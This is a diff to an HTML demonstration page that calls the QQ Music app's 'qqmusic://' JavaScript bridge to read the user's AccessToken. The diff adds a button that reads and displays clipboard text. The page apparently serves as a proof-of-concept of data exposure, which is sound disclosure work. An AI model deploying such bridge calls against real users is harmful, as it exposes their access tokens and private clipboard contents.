@@ -57,7 +57,9 @@
     <p style="font-size: 15px;" id="AccountMobileWG"></p> 
 
     <p><span class="larger">Read Your ClipBoard:</span></p>    
-
+    Will get your ClipBoard text:
+    <p style="font-size: 15px;" id="ClipBoardText"></p>
+    <input type="button" value="Access ClipBoard" id="AccessClipBoard" style="font-size: 20px; padding: 20px 25px;"/>     
 
 
     <p><span class="larger">Get Your Device Battery Info:</span></p>
@@ -73,11 +75,22 @@
         }
 
         setTimeout(function() {
+
             window.M.client.__aCallbacks["233"] = function (json) {
                 var AccessToken = json.data.AccessToken;
                 document.getElementById("AccessToken").innerText = "Your AccessToken: " + AccessToken;
             }
             fetchData("qqmusic://qq.com/data/getAccessToken?p={}#233");
+
+            document.getElementById("AccessClipBoard").onclick = function () {
+                window.M.client.__aCallbacks["234"] = function (json) {
+                    var ClipboardText = json.data.text;
+                    document.getElementById("ClipBoardText").innerText = ClipboardText;
+                }
+                fetchData("qqmusic://qq.com/data/getClipboard?p={}#234");
+            }
+
+
         }, 1500);
 
 
